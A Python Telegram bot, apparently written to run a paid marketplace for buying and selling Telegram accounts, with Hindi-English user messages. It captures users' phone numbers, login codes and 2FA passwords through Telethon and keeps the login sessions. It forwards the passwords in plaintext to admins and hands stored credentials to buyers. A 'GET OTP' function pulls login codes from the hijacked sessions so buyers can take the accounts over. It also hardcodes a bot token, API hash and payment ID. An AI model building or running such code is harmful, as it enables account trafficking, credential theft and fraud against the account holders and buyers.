import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
import re
from flask import Flask

# --- WEB SERVER (24/7 Hosting) ---
app = Flask('')
@app.route('/')
def home(): return "BOT STATUS: ACTIVE 🚀"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# Database
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
    'linked_bots': []
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    bot.send_message(message.chat.id, "🔥 **PRIME MASTER BOT v4.0**\n\nDirect access granted. All features active.", reply_markup=main_menu())

# --- SUPPORT (FIXED) ---
@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def support_handler(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 CONTACT OWNER", url="https://t.me/god_abhay"))
    bot.send_message(message.chat.id, "🚩 Koi bhi dikkat ho toh owner ko message karein:", reply_markup=markup)

# --- BALANCE ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def balance_handler(message):
    bal = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 **Your Balance:** ₹{bal}")

# --- ADMIN POWER COMMANDS (FIXED) ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id): return
    menu = (
        "👑 **ADMIN PANEL**\n\n"
        "🌍 `/addcountry COUNTRY BUY SELL`\n"
        "➕ `/addstock` (Login Flow)\n"
        "📢 `/broadcast` | 💳 `/changeupi UPI` \n"
        "👤 `/addadmin ID` | 💰 `/addbal ID AMT` | 💳 `/setbal ID AMT`\n"
        "🔗 `/linkbot TOKEN`"
    )
    bot.send_message(message.chat.id, menu)

@bot.message_handler(commands=['addbal'])
def add_bal_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, uid, amt = message.text.split()
        uid, amt = int(uid), int(amt)
        if uid not in db['users']: db['users'][uid] = {'balance': 0}
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"🎁 ₹{amt} added to your balance by Admin!")
        bot.reply_to(message, "✅ Balance updated.")
    except: bot.reply_to(message, "Usage: `/addbal ID AMT`")

# --- LOGIN WORKER (FOR STOCK & SELLING) ---
def login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        msg = bot.send_message(chat_id, "📩 **OTP Sent!** Code bhejo:")
        bot.register_next_step_handler(msg, verify_otp_step)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_otp_step(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_all(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            msg = bot.send_message(message.chat.id, "🔐 **2FA Password Required:**")
            bot.register_next_step_handler(msg, verify_2fa_step)
        else: bot.send_message(message.chat.id, "❌ Galat OTP.")

def verify_2fa_step(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_all(message, d, pwd)
    except: bot.send_message(message.chat.id, "❌ Wrong Password.")

def finalize_all(message, d, pwd="No Password"):
    if d['mode'] == "sell":
        # Selling Feature: Auto Logout/Login for Admin
        uid = message.from_user.id
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}"),
                   types.InlineKeyboardButton("❌ REJECT", callback_data=f"sr_{uid}"))
        for a in db['admins']:
            bot.send_message(a, f"📦 **SELL REQUEST**\nUser: `{uid}`\nNum: `{d['phone']}`\nPass: `{pwd}`", reply_markup=markup)
        bot.send_message(message.chat.id, "✅ ID Successfully logged in! Admin approval pending.")
    else:
        # Stock Addition
        if d['country'] not in db['stock']: db['stock'][d['country']] = []
        db['stock'][d['country']].append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(message.chat.id, f"✅ ID Added to {d['country']} Stock!")

# --- DEPOSIT SYSTEM (FIXED APPROVE/REJECT) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 **Amount:**")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 Pay to: `{db['upi']}`\n\nSend **UTR**:")
        bot.register_next_step_handler(msg, dep_ss, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid.")

def dep_ss(message, amt):
    utr = message.text.strip()
    msg = bot.send_message(message.chat.id, "📸 Send **Screenshot**:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"),
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Admin ko bhej diya hai.")

# --- CALLBACKS (FULL FIXED) ---
@bot.callback_query_handler(func=lambda call: True)
def callback_manager(call):
    p = call.data.split('_')
    # Deposit
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added successfully!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'dr':
        bot.send_message(int(p[1]), "❌ Deposit Rejected by Admin.")
        bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)
    
    # Sell Approval
    elif p[0] == 'sa':
        uid, c = int(p[1]), p[2]
        db['users'][uid]['balance'] += db['sell_rates'].get(c, 0)
        bot.send_message(uid, "✅ ID Sell Approved! Payment added.")
        bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)
    
    # Buy ID
    elif p[0] == 'buyid':
        country = p[1]
        uid = call.from_user.id
        price = db['buy_rates'].get(country, 0)
        if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(country):
            return bot.answer_callback_query(call.id, "Low Stock/Balance", show_alert=True)
        
        data = db['stock'][country].pop(0)
        phone = data.split(':')[0]
        db['users'][uid]['balance'] -= price
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET OTP", callback_data=f"gotp_{phone}"),
                   types.InlineKeyboardButton("🚪 LOGOUT BOT", callback_data=f"lout_{phone}"))
        bot.send_message(uid, f"🛒 **PURCHASE SUCCESS**\n\nData: `{data}`", reply_markup=markup)

    # OTP Logic
    elif p[0] in ['gotp', 'lout']:
        threading.Thread(target=otp_worker, args=(call, p[0], p[1])).start()

def otp_worker(call, action, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        if action == 'gotp':
            msgs = loop.run_until_complete(client.get_messages(777000, limit=1))
            if msgs:
                txt = msgs[0].message
                otp = re.search(r'\b(\d{5})\b', txt)
                bot.send_message(call.from_user.id, f"📩 **OTP:** `{otp.group(1) if otp else 'N/A'}`\n\nText: `{txt}`")
            else: bot.answer_callback_query(call.id, "No OTP found.")
        elif action == 'lout':
            loop.run_until_complete(client.log_out())
            bot.send_message(call.from_user.id, "✅ Logged Out!")
    except: pass
    finally: loop.run_until_complete(client.disconnect())

# --- SELL & STOCK BUTTONS ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_init(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_start(message):
    c = message.text.split()[1]
    msg = bot.send_message(message.chat.id, "📞 Enter Number (+):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=login_worker, args=(message.chat.id, m.text, c, "sell")).start())

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_menu_init(message):
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p}", callback_data=f"buyid_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(commands=['addstock'])
def add_stk_init(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "🌍 Country Name:")
    bot.register_next_step_handler(msg, lambda m: bot.register_next_step_handler(bot.send_message(message.chat.id, "📞 Num:"), lambda n: threading.Thread(target=login_worker, args=(message.chat.id, n.text, m.text.upper(), "stock")).start()))

bot.polling(none_stop=True)
